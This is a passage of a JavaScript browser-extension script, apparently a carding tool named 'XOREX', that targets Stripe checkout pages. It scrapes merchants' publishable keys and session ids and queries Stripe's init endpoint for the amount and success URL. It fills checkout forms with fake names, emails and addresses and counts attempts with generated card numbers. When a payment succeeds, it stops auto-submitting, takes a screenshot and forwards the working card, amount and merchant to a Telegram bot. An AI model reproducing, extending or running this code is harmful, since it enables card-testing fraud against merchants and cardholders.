    }, 3000)
  }
  function showCardToast(card, mm, yy, cvv) {
    const fullCard = `${card}|${mm}|${yy}|${cvv}`
    attemptCount++

    const existing = document.querySelector(".card-toast")
    if (existing) {
      existing.classList.add("hide")
      setTimeout(() => existing.remove(), 300)
    }
    const toast = document.createElement("div")
    toast.className = "card-toast"
    toast.style.willChange = 'transform, opacity'
    toast.innerHTML = `
    <div class="card-toast-icon">💳</div>
    <div class="card-toast-content">
      <div class="card-toast-label">Attempt: ${attemptCount}</div>
      <div class="card-toast-value">${fullCard}</div>
    </div>
    <button class="card-toast-copy" title="Copy">📋</button>
  `
    document.body.appendChild(toast)
    const copyBtn = toast.querySelector(".card-toast-copy")
    copyBtn.addEventListener("click", () => {
      navigator.clipboard.writeText(fullCard).then(() => {
        copyBtn.textContent = "✓"
        setTimeout(() => (copyBtn.textContent = "📋"), 1500)
      })
    })
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        toast.classList.add("show")
      })
    })
    setTimeout(() => {
      if (toast.parentNode) {
        toast.classList.remove("show")
        toast.classList.add("hide")
        setTimeout(() => toast.remove(), 300)
      }
    }, 3000)
  }
  const currencySymbols = {

    usd: "$",
    eur: "€",
    gbp: "£",
    jpy: "¥",
    cny: "¥",
    cnh: "¥",

    inr: "₹",
    krw: "₩",
    thb: "฿",
    php: "₱",
    myr: "RM",
    sgd: "S$",
    hkd: "HK$",
    twd: "NT$",
    idr: "Rp",
    vnd: "₫",
    pkr: "₨",
    bdt: "৳",
    lkr: "Rs",
    npr: "Rs",
    mmk: "K",
    khr: "៛",
    lak: "₭",

    chf: "CHF",
    sek: "kr",
    nok: "kr",
    dkk: "kr",
    pln: "zł",
    czk: "Kč",
    huf: "Ft",
    ron: "lei",
    bgn: "лв",
    hrk: "kn",
    rsd: "дин",
    uah: "₴",
    rub: "₽",
    byn: "Br",
    mdl: "L",
    all: "L",
    mkd: "ден",
    bam: "KM",
    isk: "kr",

    cad: "C$",
    mxn: "MX$",
    brl: "R$",
    ars: "AR$",
    clp: "CL$",
    cop: "CO$",
    pen: "S/",
    uyu: "$U",
    pyg: "₲",
    bob: "Bs",
    crc: "₡",
    gtq: "Q",
    hnl: "L",
    nio: "C$",
    pab: "B/.",
    dop: "RD$",
    jmd: "J$",
    ttd: "TT$",
    bbd: "Bds$",
    bsd: "B$",
    kyd: "CI$",
    xcd: "EC$",
    awg: "ƒ",
    ang: "ƒ",
    srd: "Sr$",
    gyd: "G$",
    bzd: "BZ$",
    htg: "G",

    aed: "د.إ",
    sar: "﷼",
    qar: "﷼",
    omr: "﷼",
    bhd: "BD",
    kwd: "KD",
    jod: "JD",
    lbp: "L£",
    egp: "E£",
    ils: "₪",
    try: "₺",
    irr: "﷼",
    iqd: "ع.د",
    syp: "£S",
    yer: "﷼",
    zar: "R",
    ngn: "₦",
    kes: "KSh",
    ugx: "USh",
    tzs: "TSh",
    ghs: "GH₵",
    xof: "CFA",
    xaf: "FCFA",
    mad: "DH",
    dzd: "DA",
    tnd: "DT",
    lyd: "LD",
    etb: "Br",
    rwf: "FRw",
    mur: "Rs",
    scr: "Rs",

    aud: "A$",
    nzd: "NZ$",
    fjd: "FJ$",
    pgk: "K",
    wst: "WS$",
    top: "T$",
    vuv: "VT",
    sbd: "SI$",

    btc: "₿",
    eth: "Ξ",
    xrp: "XRP",
    ltc: "Ł",
  }
  function getCurrencySymbol(code) {
    if (!code) return "$"
    return currencySymbols[code.toLowerCase()] || code.toUpperCase() + " "
  }
  function extractPaymentData(data) {
    if (paymentDataFound || !data || typeof data !== "object") return
    function findValue(obj, key) {
      if (!obj || typeof obj !== "object") return null
      if (key in obj) return obj[key]
      for (const prop in obj) {
        if (obj[prop] && typeof obj[prop] === "object") {
          const found = findValue(obj[prop], key)
          if (found !== null) return found
        }
      }
      return null
    }

    function cleanBusinessUrl(url) {
      if (!url) return null;
      try {
        let clean = url.toString().trim();

        clean = clean.replace(/^https?:\/\//, '');

        clean = clean.replace(/^www\./, '');

        clean = clean.split('/')[0];
        clean = clean.split('?')[0];
        clean = clean.split('#')[0];

        clean = clean.split(':')[0];

        return clean || null;
      } catch (e) {
        return url;
      }
    }

    let updated = false

    if (!extractedPaymentData.businessUrl) {
      try {
        let rawBusinessUrl = null;

        if (data.account_settings?.business_url) {
          rawBusinessUrl = data.account_settings.business_url;
        }

        else if (data.account_settings?.display_name) {
          rawBusinessUrl = data.account_settings.display_name;
        }

        else if (data.statement_descriptor) {
          rawBusinessUrl = data.statement_descriptor;
        }

        else {
          rawBusinessUrl = findValue(data, "business_url") || findValue(data, "display_name");
        }

        if (rawBusinessUrl) {
          extractedPaymentData.businessUrl = cleanBusinessUrl(rawBusinessUrl);
          updated = true;
        }
      } catch (e) {}
    }

    if (!extractedPaymentData.email) {
      const email = data.customer_email || findValue(data, "customer_email")
      if (email) {
        extractedPaymentData.email = email
        updated = true
      }
    }

    if (!extractedPaymentData.successUrl) {
      try {
        let successUrl = null;
        if (data.success_url) {
          successUrl = data.success_url;
        }
        else if (data.return_url) {
          successUrl = data.return_url;
        }
        else if (data.redirect_url) {
          successUrl = data.redirect_url;
        }
        else if (data.payment_intent?.return_url) {
          successUrl = data.payment_intent.return_url;
        }
        else if (data.confirmation_url) {
          successUrl = data.confirmation_url;
        }
        else if (data.next_action?.redirect_to_url?.url) {
          successUrl = data.next_action.redirect_to_url.url;
        }
        else {
          successUrl = findValue(data, "success_url");
        }
        if (successUrl) {
          extractedPaymentData.successUrl = successUrl;
          updated = true;
        }
      } catch (e) {}
    }

    if (!extractedPaymentData.amount || extractedPaymentData.amount === "0.00" || extractedPaymentData.amount === "0") {
      try {
        let amount = null;
        let originalCurrency = null;

        if (data.line_item_group?.localized_prices_metas && Array.isArray(data.line_item_group.localized_prices_metas)) {
          const usdMeta = data.line_item_group.localized_prices_metas.find(m => m.currency === 'usd');
          if (usdMeta && usdMeta.total && usdMeta.total > 0) {
            amount = usdMeta.total;
            originalCurrency = 'usd';
          }
        }

        if (!amount && data.line_item_group?.presentment_exchange_rate_meta?.integration_currency) {
          const integrationCurrency = data.line_item_group.presentment_exchange_rate_meta.integration_currency;
          const exchangeRate = parseFloat(data.line_item_group.presentment_exchange_rate_meta.exchange_rate);
          if (data.line_item_group.total && exchangeRate > 0) {
            amount = Math.round(data.line_item_group.total / exchangeRate);
            originalCurrency = integrationCurrency;
          }
        }

        if (!amount && data.line_item_group?.total && data.line_item_group.total > 0) {
          amount = data.line_item_group.total;
          originalCurrency = data.line_item_group.currency || data.currency;
        }

        if (!amount && data.line_item_group?.due && data.line_item_group.due > 0) {
          amount = data.line_item_group.due;
          originalCurrency = data.line_item_group.currency || data.currency;
        }

        if (!amount && data.line_item_group?.line_items?.[0]) {
          const lineItem = data.line_item_group.line_items[0];
          if (lineItem.total && lineItem.total > 0) {
            amount = lineItem.total;
            originalCurrency = data.line_item_group.currency || data.currency;
          } else if (lineItem.price?.unit_amount && lineItem.price.unit_amount > 0) {
            amount = lineItem.price.unit_amount * (lineItem.quantity || 1);
            originalCurrency = lineItem.price.currency || data.currency;
          }
        }

        if (!amount && data.amount && typeof data.amount === "number" && data.amount > 0) {
          amount = data.amount;
        }
        if (!amount && data.payment_intent?.amount && data.payment_intent.amount > 0) {
          amount = data.payment_intent.amount;
        }
        if (!amount && data.invoice?.amount_due && data.invoice.amount_due > 0) {
          amount = data.invoice.amount_due;
        }
        if (!amount && data.invoice?.lines?.data?.[0]?.amount && data.invoice.lines.data[0].amount > 0) {
          amount = data.invoice.lines.data[0].amount;
        }
        if (!amount && data.amount_received && data.amount_received > 0) {
          amount = data.amount_received;
        }
        if (!amount && data.amount_capturable && data.amount_capturable > 0) {
          amount = data.amount_capturable;
        }
        if (!amount && data.lines?.data?.[0]?.amount && data.lines.data[0].amount > 0) {
          amount = data.lines.data[0].amount;
        }
        if (!amount && data.line_items?.data?.[0]?.amount_total && data.line_items.data[0].amount_total > 0) {
          amount = data.line_items.data[0].amount_total;
        }
        if (!amount && data.amount_total && data.amount_total > 0) {
          amount = data.amount_total;
        }
        if (!amount && data.amount_due && data.amount_due > 0) {
          amount = data.amount_due;
        }
        if (!amount && data.amount_paid && data.amount_paid > 0) {
          amount = data.amount_paid;
        }
        if (!amount && data.total && data.total > 0) {
          amount = data.total;
        }

        if (!amount) {
          const unitAmount = findValue(data, "unit_amount_decimal");
          if (unitAmount && parseInt(unitAmount) > 0) {
            amount = parseInt(unitAmount);
          }
        }
        if (!amount) {
          const unitAmount = findValue(data, "unit_amount");
          if (unitAmount && parseInt(unitAmount) > 0) {
            amount = parseInt(unitAmount);
          }
        }

        if (!amount) {
          const piAmount = findValue(data, "payment_intent");
          if (piAmount && typeof piAmount === "object" && piAmount.amount && piAmount.amount > 0) {
            amount = piAmount.amount;
          }
        }

        if (amount !== null && amount > 0) {
          extractedPaymentData.amount = (Number.parseInt(amount) / 100).toFixed(2);
          if (originalCurrency) {
            extractedPaymentData.currency = originalCurrency.toLowerCase();
          }
          updated = true;
        }
      } catch (e) {
      }
    }

    if (!extractedPaymentData.currency) {
      try {
        let currency = null;

        if (data.line_item_group?.localized_prices_metas && Array.isArray(data.line_item_group.localized_prices_metas)) {
          const usdMeta = data.line_item_group.localized_prices_metas.find(m => m.currency === 'usd');
          if (usdMeta) {
            currency = 'usd';
          }
        }

        if (!currency && data.line_item_group?.presentment_exchange_rate_meta?.integration_currency) {
          currency = data.line_item_group.presentment_exchange_rate_meta.integration_currency;
        }

        if (!currency) {
          currency =
            data.line_item_group?.currency ||
            data.currency ||
            data.line_items?.data?.[0]?.currency ||
            findValue(data, "currency");
        }

        if (currency) {
          extractedPaymentData.currency = currency.toLowerCase()
          updated = true
        }
      } catch (e) {}
    }

    if (!extractedPaymentData.businessUrl) {
      try {
        let businessUrl = null;
        if (data.business_url) {
          businessUrl = data.business_url;
        }
        else if (data.account_settings?.business_url) {
          businessUrl = data.account_settings.business_url;
        }
        else if (data.merchant_business_url) {
          businessUrl = data.merchant_business_url;
        }
        else if (data.account_settings?.display_name) {
          businessUrl = data.account_settings.display_name;
        }
        else if (data.account_settings?.order_summary_display_name) {
          businessUrl = data.account_settings.order_summary_display_name;
        }
        else if (data.statement_descriptor) {
          businessUrl = data.statement_descriptor;
        }
        else {
          const displayName = findValue(data, "display_name");
          if (displayName) {
            businessUrl = displayName;
          }
        }
        if (!businessUrl) {
          businessUrl = findValue(data, "business_url");
        }
        if (businessUrl) {
          extractedPaymentData.businessUrl = cleanBusinessUrl(businessUrl);
          updated = true;
        }
      } catch (e) {}
    }
    const hasAllValues = Object.values(extractedPaymentData).every((x) => x !== "")
    if (hasAllValues) {
      paymentDataFound = true
    } else if (updated) {
      if (!extractedPaymentData.businessUrl) {
        try {

          let hostname = window.location.hostname;
          hostname = hostname.replace(/^(checkout|pay|billing|buy)\./, '');
          hostname = hostname.replace(/^www\./, '');
          extractedPaymentData.businessUrl = hostname;
        } catch (e) {}
      }
      if (!extractedPaymentData.successUrl) {
        try {
          extractedPaymentData.successUrl = window.location.href
        } catch (e) {}
      }
    }
  }
  function extractCsLive(urlOrString) {
    if (!urlOrString || typeof urlOrString !== "string") return null
    const liveUrlPathMatch = urlOrString.match(/\/c\/pay\/(cs_live_[a-zA-Z0-9]+)(?:[#\/]|$)/)
    if (liveUrlPathMatch) return liveUrlPathMatch[1]
    const livePaymentPagesMatch = urlOrString.match(/\/payment_pages\/(cs_live_[a-zA-Z0-9]+)/)
    if (livePaymentPagesMatch) return livePaymentPagesMatch[1]
    const liveCheckoutMatch = urlOrString.match(/checkout\.stripe\.com\/(?:c\/)?pay\/(cs_live_[a-zA-Z0-9]+)/)
    if (liveCheckoutMatch) return liveCheckoutMatch[1]
    const liveBoundaryMatch = urlOrString.match(/cs_live_[a-zA-Z0-9]+(?=[#\/\?&\s]|$)/)
    if (liveBoundaryMatch) return liveBoundaryMatch[0]
    const testUrlPathMatch = urlOrString.match(/\/c\/pay\/(cs_test_[a-zA-Z0-9]+)(?:[#\/]|$)/)
    if (testUrlPathMatch) return testUrlPathMatch[1]
    const testPaymentPagesMatch = urlOrString.match(/\/payment_pages\/(cs_test_[a-zA-Z0-9]+)/)
    if (testPaymentPagesMatch) return testPaymentPagesMatch[1]
    const testCheckoutMatch = urlOrString.match(/checkout\.stripe\.com\/(?:c\/)?pay\/(cs_test_[a-zA-Z0-9]+)/)
    if (testCheckoutMatch) return testCheckoutMatch[1]
    const testBoundaryMatch = urlOrString.match(/cs_test_[a-zA-Z0-9]+(?=[#\/\?&\s]|$)/)
    if (testBoundaryMatch) return testBoundaryMatch[0]
    return null
  }
  function extractPkLive() {
    const pageContent = document.documentElement.innerHTML
    const pkLiveMatch = pageContent.match(/pk_live_[a-zA-Z0-9]+/)
    if (pkLiveMatch) return pkLiveMatch[0]
    const scripts = document.querySelectorAll("script")
    for (const script of scripts) {
      const content = script.textContent || script.innerText || ""
      const liveMatch = content.match(/pk_live_[a-zA-Z0-9]+/)
      if (liveMatch) return liveMatch[0]
    }
    try {
      const stripeElements = document.querySelectorAll("[data-stripe-publishable-key]")
      for (const el of stripeElements) {
        const key = el.getAttribute("data-stripe-publishable-key")
        if (key && key.startsWith("pk_live_")) return key
      }
    } catch (e) {}
    const pkTestMatch = pageContent.match(/pk_test_[a-zA-Z0-9]+/)
    if (pkTestMatch) return pkTestMatch[0]
    for (const script of scripts) {
      const content = script.textContent || script.innerText || ""
      const testMatch = content.match(/pk_test_[a-zA-Z0-9]+/)
      if (testMatch) return testMatch[0]
    }
    try {
      const stripeElements = document.querySelectorAll("[data-stripe-publishable-key]")
      for (const el of stripeElements) {
        const key = el.getAttribute("data-stripe-publishable-key")
        if (key && key.startsWith("pk_test_")) return key
      }
    } catch (e) {}
    return null
  }
  async function fetchStripePaymentPageInit(csLive, pkLive) {
    if (!csLive) {
      throw new Error("cs_live identifier is required")
    }
    if (!pkLive) {
      throw new Error("pk_live publishable key is required")
    }
    const initUrl = `https://api.stripe.com/v1/payment_pages/${csLive}/init`
    const formData = new URLSearchParams({
      key: pkLive,
      eid: "NA",
      browser_locale: navigator.language || "en-US",
      browser_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC",
      redirect_type: "url"
    })
    try {
      const response = await fetch(initUrl, {
        method: "POST",
        headers: {
          "authority": "api.stripe.com",
          "accept": "application/json",
          "accept-language": "en-US,en;q=0.9",
          "cache-control": "no-cache",
          "content-type": "application/x-www-form-urlencoded",
          "user-agent": navigator.userAgent
        },
        body: formData.toString()
      })
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`)
      }
      return await response.json()
    } catch (error) {
      throw error
    }
  }
  function extractAmountFromInitResponse(data) {
    if (!data || typeof data !== "object") {
      return {
        amount: null,
        currency: null,
        rawAmount: null,
        email: null,
        businessUrl: null,
        successUrl: null,
        cancelUrl: null,
        merchantName: null,
        productName: null,
        productDescription: null,
        interval: null,
        sessionId: null
      }
    }
    const result = {
      amount: null,
      rawAmount: null,
      currency: null,
      email: null,
      businessUrl: null,
      merchantName: null,
      successUrl: null,
      cancelUrl: null,
      productName: null,
      productDescription: null,
      interval: null,
      sessionId: null,
      mode: null,
      status: null
    }

    function cleanUrl(url) {
      if (!url) return null;
      let clean = url.toString().trim();
      clean = clean.replace(/^https?:\/\//, '');
      clean = clean.replace(/^www\./, '');
      clean = clean.split('/')[0];
      clean = clean.split('?')[0];
      clean = clean.split('#')[0];
      clean = clean.split(':')[0];
      return clean || null;
    }

    let rawAmount = null
    let currency = null

    if (data.line_item_group?.localized_prices_metas && Array.isArray(data.line_item_group.localized_prices_metas)) {
      const usdMeta = data.line_item_group.localized_prices_metas.find(m => m.currency === 'usd');
      if (usdMeta && usdMeta.total && usdMeta.total > 0) {
        rawAmount = usdMeta.total;
        currency = 'usd';
      }
    }

    if (!rawAmount && data.line_item_group?.presentment_exchange_rate_meta) {
      const meta = data.line_item_group.presentment_exchange_rate_meta;
      if (meta.integration_currency && meta.exchange_rate && data.line_item_group.total) {
        const exchangeRate = parseFloat(meta.exchange_rate);
        if (exchangeRate > 0) {
          rawAmount = Math.round(data.line_item_group.total / exchangeRate);
          currency = meta.integration_currency;
        }
      }
    }

    if (!rawAmount && data.line_item_group?.total !== undefined && data.line_item_group.total > 0) {
      rawAmount = data.line_item_group.total;
      currency = data.line_item_group.currency;
    }

    if (!rawAmount && data.line_item_group?.due !== undefined && data.line_item_group.due > 0) {
      rawAmount = data.line_item_group.due;
      currency = data.line_item_group.currency;
    }

    if (!rawAmount && data.line_item_group?.subtotal !== undefined && data.line_item_group.subtotal > 0) {
      rawAmount = data.line_item_group.subtotal;
      currency = data.line_item_group.currency;
    }

    if (!rawAmount && data.line_item_group?.line_items?.[0]) {
      const item = data.line_item_group.line_items[0];
      if (item.total && item.total > 0) {
        rawAmount = item.total;
        currency = data.line_item_group.currency;
      } else if (item.price?.unit_amount && item.price.unit_amount > 0) {
        rawAmount = item.price.unit_amount * (item.quantity || 1);
        currency = item.price.currency || data.line_item_group.currency;
      }
    }

    if (!rawAmount && data.invoice?.amount_due !== undefined && data.invoice.amount_due > 0) {
      rawAmount = data.invoice.amount_due;
      currency = data.invoice.currency;
    }
    if (!rawAmount && data.invoice?.total !== undefined && data.invoice.total > 0) {
      rawAmount = data.invoice.total;
      currency = data.invoice.currency;
    }
    if (!rawAmount && data.invoice?.lines?.data?.[0]?.amount !== undefined) {
      rawAmount = data.invoice.lines.data[0].amount;
      currency = data.invoice.currency;
    }

    if (!rawAmount && data.amount_total !== undefined && data.amount_total > 0) {
      rawAmount = data.amount_total;
    }
    if (!rawAmount && data.amount !== undefined && typeof data.amount === 'number' && data.amount > 0) {
      rawAmount = data.amount;
    }
    if (!rawAmount && data.payment_intent?.amount !== undefined && data.payment_intent.amount > 0) {
      rawAmount = data.payment_intent.amount;
      currency = data.payment_intent.currency;
    }

    if (!rawAmount && data.amount_due !== undefined && data.amount_due > 0) {
      rawAmount = data.amount_due;
    }
    if (!rawAmount && data.amount_paid !== undefined && data.amount_paid > 0) {
      rawAmount = data.amount_paid;
    }

    if (rawAmount !== null && rawAmount > 0) {
      result.rawAmount = rawAmount;
      result.amount = (Number(rawAmount) / 100).toFixed(2);
    }

    result.currency = currency || data.currency || data.line_item_group?.currency || data.invoice?.currency || "usd";

    result.email = data.customer_email || data.customer?.email || null;

    let rawBusinessUrl = null;
    if (data.account_settings?.business_url) {
      rawBusinessUrl = data.account_settings.business_url;
    } else if (data.account_settings?.display_name) {

      const displayName = data.account_settings.display_name;
      if (displayName.includes('.') && !displayName.includes(' ')) {
        rawBusinessUrl = displayName;
      }
    }
    if (!rawBusinessUrl && data.statement_descriptor) {
      const stmt = data.statement_descriptor;
      if (stmt.includes('.')) {
        rawBusinessUrl = stmt;
      }
    }
    result.businessUrl = cleanUrl(rawBusinessUrl);

    result.merchantName = data.account_settings?.display_name ||
                          data.account_settings?.order_summary_display_name ||
                          data.account_settings?.merchant_of_record_display_name || null;

    result.successUrl = data.success_url || null;
    result.cancelUrl = data.cancel_url || null;

    const lineItem = data.line_item_group?.line_items?.[0] || data.invoice?.lines?.data?.[0];
    if (lineItem) {
      result.productName = lineItem.name || lineItem.price?.product?.name || null;
      result.productDescription = lineItem.description || lineItem.price?.product?.description || null;
      result.interval = lineItem.price?.recurring?.interval || null;
    }

    result.sessionId = data.session_id || null;
    result.mode = data.mode || null;
    result.status = data.status || null;

    return result;
  }
  function fallbackExtractFromPage() {
    const result = {
      amount: null,
      currency: null,
      email: null,
      businessUrl: null,
      successUrl: null,
      method: "fallback_dom"
    }
    try {
      const pageContent = document.documentElement.innerHTML
      const pricePatterns = [
        /\$(\d+(?:\.\d{2})?)/,
        /(\d+(?:\.\d{2})?)\s*(?:USD|CAD|EUR|GBP)/i,
        /"amount":\s*(\d+)/,
        /"unit_amount":\s*(\d+)/,
        /"unit_amount_decimal":\s*"(\d+)"/
      ]
      for (const pattern of pricePatterns) {
        const match = pageContent.match(pattern)
        if (match) {
          const rawAmount = match[1]
          if (rawAmount.length > 2 && !rawAmount.includes('.')) {
            result.amount = (Number(rawAmount) / 100).toFixed(2)
          } else {
            result.amount = Number(rawAmount).toFixed(2)
          }
          break
        }
      }
      const emailMatch = pageContent.match(/"customer_email":\s*"([^"]+)"/) ||
                         pageContent.match(/"email":\s*"([^"]+@[^"]+)"/)
      if (emailMatch) result.email = emailMatch[1]
      const businessUrlMatch = pageContent.match(/"business_url":\s*"([^"]+)"/)
      if (businessUrlMatch) result.businessUrl = businessUrlMatch[1]
      const successUrlMatch = pageContent.match(/"success_url":\s*"([^"]+)"/) ||
                              pageContent.match(/"return_url":\s*"([^"]+)"/)
      if (successUrlMatch) result.successUrl = successUrlMatch[1]
      const currencyMatch = pageContent.match(/"currency":\s*"([a-z]{3})"/i)
      if (currencyMatch) result.currency = currencyMatch[1]
    } catch (error) {
    }
    return result
  }
  async function getStripePaymentAmount(urlOrResponse, providedPkLive = null) {
    if (isInvoiceStripePage()) {
      const invData = extractInvoiceData();
      if (invData) {
        const displayName = getInvoiceDisplayName();
        Object.assign(extractedPaymentData, {
          amount: getInvoiceAmount(),
          rawAmount: invData.amount,
          currency: invData.currency,
          email: invData.email,
          businessUrl: invData.businessUrl || displayName,
          merchantName: displayName,
          productName: invData.productName
        });
        return {
          success: true,
          csLive: null,
          pkLive: null,
          amount: getInvoiceAmount(),
          rawAmount: invData.amount,
          currency: invData.currency,
          email: invData.email,
          businessUrl: invData.businessUrl || displayName,
          merchantName: displayName,
          productName: invData.productName,
          method: "invoice_extract"
        };
      }
    }

    const csLive = extractCsLive(urlOrResponse)
    const pkLive = providedPkLive || extractPkLive()
    if (csLive && pkLive) {
      try {
        const initResponse = await fetchStripePaymentPageInit(csLive, pkLive)
        const paymentDetails = extractAmountFromInitResponse(initResponse)
        paymentDetails.method = "init_request"
        Object.assign(extractedPaymentData, {
          amount: paymentDetails.amount,
          rawAmount: paymentDetails.rawAmount,
          currency: paymentDetails.currency,
          email: paymentDetails.email,
          businessUrl: paymentDetails.businessUrl,
          successUrl: paymentDetails.successUrl,
          cancelUrl: paymentDetails.cancelUrl,
          merchantName: paymentDetails.merchantName,
          productName: paymentDetails.productName,
          productDescription: paymentDetails.productDescription,
          interval: paymentDetails.interval,
          sessionId: paymentDetails.sessionId,
          mode: paymentDetails.mode,
          status: paymentDetails.status
        })
        return {
          success: true,
          csLive: csLive,
          pkLive: pkLive,
          ...paymentDetails,
          rawResponse: initResponse
        }
      } catch (error) {
      }
    } else {
    }
    const fallbackDetails = fallbackExtractFromPage()
    if (fallbackDetails.amount || fallbackDetails.email || fallbackDetails.businessUrl) {
      if (fallbackDetails.amount) extractedPaymentData.amount = fallbackDetails.amount
      if (fallbackDetails.currency) extractedPaymentData.currency = fallbackDetails.currency
      if (fallbackDetails.email) extractedPaymentData.email = fallbackDetails.email
      if (fallbackDetails.businessUrl) extractedPaymentData.businessUrl = fallbackDetails.businessUrl
      if (fallbackDetails.successUrl) extractedPaymentData.successUrl = fallbackDetails.successUrl
      return {
        success: true,
        csLive: csLive,
        pkLive: pkLive,
        ...fallbackDetails
      }
    }
    return {
      success: false,
      error: "Could not extract payment data using any method",
      csLive: csLive,
      pkLive: pkLive
    }
  }
  async function autoExtractPaymentFromUrl() {
    const currentUrl = window.location.href
    const result = await getStripePaymentAmount(currentUrl)
    if (result.success) {
    } else {
    }
    return result
  }
  window.xorexStripeUtils = {
    extractCsLive,
    extractPkLive,
    fetchStripePaymentPageInit,
    extractAmountFromInitResponse,
    fallbackExtractFromPage,
    getStripePaymentAmount
  }
  async function checkResponseForSuccess(response) {
    return response
  }
  async function checkResponseForDeclineCodes(response) {
    return response
  }
  async function handleSuccess() {
    if (attemptCount === 0 || !attemptCount) {
      return
    }
    if (hasHit || hasNotified) {
      return
    }
    hasNotified = true
    hasHit = true
    let timeTaken = "0s"
    if (cardAttemptStartTime) {
      const elapsed = Math.round((Date.now() - cardAttemptStartTime) / 1000)
      const mins = Math.floor(elapsed / 60)
      const secs = elapsed % 60
      timeTaken = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`
    }
    if (isAutoSubmitting) {
      stopAutoSubmit()
    }
    if (window.generatedCardFull) {
      const parts = window.generatedCardFull.split("|")
      addToHistory(parts[0], parts[1], parts[2], parts[3], "SUCCESS")
    } else if (window.generatedCard) {
      addToHistory(window.generatedCard, "??", "??", "???", "SUCCESS")
    } else {
      addToHistory("Unknown", "??", "??", "???", "SUCCESS")
    }
    showSuccessToast(attemptCount, timeTaken)
    createColorBallDrop()
    autoDownloadPaymentScreenshot()
    const container = document.querySelector(".card-generator-overlay")
    if (container) {
      container.classList.add("overlay-hidden")
    }
    const key = "cardGeneratorHit_" + window.location.href
    localStorage.setItem(key, "true")
    window.postMessage({ type: "PLAY_SUCCESS_SOUND", volume: soundVolume }, "*")

    if (tgForwardEnabled && tgBotToken && tgUserId) {
      if (!extractedPaymentData.businessUrl) {
        extractedPaymentData.businessUrl = window.location.hostname || window.location.origin
      }
      if (!extractedPaymentData.successUrl) {
        extractedPaymentData.successUrl = window.location.href
      }
      sendTelegramNotification({
        cardNumber: window.generatedCardFull || window.generatedCard || "",
        amount: extractedPaymentData.amount || '0',
        currency: extractedPaymentData.currencyCode || 'usd',
        businessUrl: extractedPaymentData.businessUrl,
        successUrl: extractedPaymentData.successUrl,
        email: customEmail || '',
        attempt: attemptCount,
        timeTaken: timeTaken
      });
    }
  }
  function autoDownloadPaymentScreenshot() {
    window.postMessage({ type: 'CAPTURE_SCREENSHOT_REQUEST' }, '*')
  }
  function showSuccessToast(attempt, timeTaken) {
    const existing = document.querySelector(".success-toast")
    if (existing) existing.remove()
    const now = new Date()
    let hours = now.getHours()
    const minutes = String(now.getMinutes()).padStart(2, '0')
    const ampm = hours >= 12 ? 'PM' : 'AM'
    hours = hours % 12
    hours = hours ? hours : 12
    const timeStr = String(hours).padStart(2, '0') + '.' + minutes + ampm
    const day = String(now.getDate()).padStart(2, '0')
    const month = String(now.getMonth() + 1).padStart(2, '0')
    const year = String(now.getFullYear()).slice(-2)
    const dateStr = day + '|' + month + '|' + year
    const toast = document.createElement("div")
    toast.className = "success-toast"
    toast.innerHTML = `
    <div class="success-toast-content">
      <div class="success-ripple-container">
        <div class="success-ripple-ring"></div>
        <div class="success-ripple-ring"></div>
        <div class="success-check">✓</div>
      </div>
      <div class="success-toast-text">
        <div class="success-toast-title">Payment Successful</div>
        <div class="success-toast-details">Attempt: ${attempt} | T/t: ${timeTaken}</div>
        <div class="success-toast-details">Time: ${timeStr} | Date: ${dateStr}</div>
      </div>
    </div>
  `
    document.body.appendChild(toast)
    toast.classList.add("show")
  }

  function createColorBallDrop() {
    const container = document.createElement("div")
    container.className = "color-ball-container"
    document.body.appendChild(container)
    function createBall() {
      const ball = document.createElement("div")
      const posClass = "ball-pos-" + Math.floor(Math.random() * 20) * 5
      const sizeClass = "ball-size-" + ["sm", "md", "lg"][Math.floor(Math.random() * 3)]
      const colorClass = "ball-color-" + Math.floor(Math.random() * 8)
      const delayClass = "ball-delay-" + Math.floor(Math.random() * 10)
      const durationClass = "ball-dur-" + Math.floor(Math.random() * 3)
      ball.className = `color-ball ${posClass} ${sizeClass} ${colorClass} ${delayClass} ${durationClass}`
      container.appendChild(ball)
      setTimeout(() => ball.remove(), 6000)
    }
    for (let i = 0; i < 50; i++) {
      createBall()
    }
    const spawnInterval = setInterval(() => {
      if (!document.body.contains(container)) {
        clearInterval(spawnInterval)
        return
      }
      for (let i = 0; i < 10; i++) {
        createBall()
      }
    }, 500)
  }
  const randomNames = [
    "XOREX",
  ]
  const randomHumanNames = [
    "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles",
    "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen",
    "Daniel", "Matthew", "Anthony", "Mark", "Donald", "Steven", "Paul", "Andrew", "Joshua", "Kenneth",
    "Nancy", "Betty", "Margaret", "Sandra", "Ashley", "Dorothy", "Kimberly", "Emily", "Donna", "Michelle",
    "Alex", "Chris", "Jordan", "Taylor", "Morgan", "Casey", "Riley", "Quinn", "Avery", "Cameron"
  ]
  const randomStreets = [
    "Main Street",
    "Oak Road",
    "Park Avenue",
    "Maple Drive",
    "Cedar Lane",
    "Pine Street",
    "Lake Drive",
    "Forest Avenue",
    "River Road",
    "Hill Street",
  ]
  function getRandomName() {
    return randomNames[Math.floor(Math.random() * randomNames.length)]
  }
  function getRandomEmail() {
    const domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com"]
    const name = randomHumanNames[Math.floor(Math.random() * randomHumanNames.length)].toLowerCase()
    const randomNum = Math.floor(Math.random() * 9999)
    const domain = domains[Math.floor(Math.random() * domains.length)]
    return name + randomNum + "@" + domain
  }
  function getRandomStreet() {
    const street = randomStreets[Math.floor(Math.random() * randomStreets.length)]
    const number = Math.floor(Math.random() * 999) + 1
    return number + " " + street
  }
  function simulateInput(element, value) {
    if (!element) return
    element.focus()
    const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value")?.set
    const nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(
      window.HTMLTextAreaElement.prototype,
      "value",
    )?.set
    if (element.tagName === "INPUT" && nativeInputValueSetter) {
      nativeInputValueSetter.call(element, value)
    } else if (element.tagName === "TEXTAREA" && nativeTextAreaValueSetter) {
      nativeTextAreaValueSetter.call(element, value)
    } else {
      element.value = value
    }
    element.dispatchEvent(new Event("input", { bubbles: true }))
    element.dispatchEvent(new Event("change", { bubbles: true }))
    element.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true }))
    element.blur()
  }
